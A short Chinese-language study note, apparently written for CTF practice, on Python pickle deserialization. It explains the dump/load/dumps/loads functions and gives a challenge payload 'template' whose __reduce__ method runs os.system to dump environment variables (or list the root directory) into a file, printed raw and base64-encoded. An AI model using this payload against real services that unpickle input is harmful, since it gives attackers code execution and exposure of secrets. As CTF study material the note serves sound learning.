pickle

//2023/11/29

[pickle 反序列化漏洞浅析_pickle.loads_Derait的博客-CSDN博客](https://blog.csdn.net/Derait/article/details/119487233?ops_request_misc=&request_id=&biz_id=102&utm_term=pickle ctf&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-3-119487233.142^v96^pc_search_result_base1&spm=1018.2226.3001.4187)

![1701241932734](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\1701241932734.png)

```
#序列化
pickle.dump(obj, file, protocol=None,)
obj表示要进行封装的对象(必填参数）
file表示obj要写入的文件对象
以二进制可写模式打开即wb(必填参数）
#反序列化
pickle.load(file, *, fix_imports=True, encoding="ASCII", errors="strict", buffers=None)
file文件中读取封存后的对象
以二进制可读模式打开即rb(必填参数)

```

```
#序列化
pickle.dumps(obj, protocol=None,*,fix_imports=True)
dumps()方法不需要写入文件中，直接返回一个序列化的bytes对象。
#反序列化
pickle.loads(bytes_object, *,fix_imports=True, encoding="ASCII". errors="strict")
loads()方法是直接从bytes对象中读取序列化的信息，而非从文件中读取。

```





[[HZNUCTF 2023 preliminary\]pickle | NSSCTF](https://www.nssctf.cn/problem/3611)

此题payload，也可看作一个模板

```
import pickle  
import base64  
  
class rayi(object):  
def __reduce__(self):  
#return eval,("__import__('o'+'s').system('ls / | tee a')",)  
return eval,("__import__('o'+'s').system('env | tee a')",)  
  
a=rayi()  
print(pickle.dumps(a))  
print(base64.b64encode(pickle.dumps(a)))
```



```

```

